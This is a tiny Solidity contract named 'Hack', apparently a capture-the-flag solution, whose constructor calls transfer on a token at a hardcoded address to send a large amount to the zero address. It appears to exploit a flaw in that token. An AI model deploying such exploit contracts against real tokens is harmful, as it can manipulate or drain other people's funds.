// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoin {
	function transfer(address _to, uint256 _value) external returns (bool);
}

contract Hack {
	constructor() {
		ICoin token = ICoin(address(0x81C57E708605c21222C85FbCE0405567390aa774));
		token.transfer(address(0), 1000000 * (10 ** uint256(18)));
	}
}